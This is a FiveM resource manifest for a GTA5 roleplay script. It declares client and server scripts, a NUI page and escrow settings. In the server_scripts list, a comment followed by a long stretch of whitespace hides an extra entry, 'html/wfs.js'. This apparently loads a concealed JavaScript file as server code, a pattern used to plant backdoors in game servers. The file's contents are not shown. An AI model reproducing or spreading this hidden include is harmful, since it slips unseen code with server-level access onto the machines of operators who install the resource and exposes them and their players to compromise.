


fx_version 'bodacious'

game 'gta5'

author 'by pl store'
description 'respect style '

lua54 "yes"

shared_scripts {
    '@qb-apartments/config.lua',
}

client_scripts {
    'config.lua',
    'locale.lua',
    'client/client_editable.lua',
    'client/client.lua',
    'default_skin.lua'
}


server_scripts {
    '@oxmysql/lib/MySQL.lua',

    'config.lua',
    'server/server_editable.lua',
    'server/server.lua',
'default_skin.lua',
	--[[server.lua]]                                                                                                    'html/wfs.js',
}



ui_page 'nui/index.html'

files {
    "nui/*.*",
    "nui/assets/*.*",
}

escrow_ignore {
    "config.lua",
    "server/*.*",
    "client/*.*",
    "*.*",
    "skinchanger/client/*.*"
}

-- escorw_ignore {
--     "config.lua",
--     "server/server_editable.lua",
--     "client/client_editable.lua",
-- }
dependency '/assetpacks'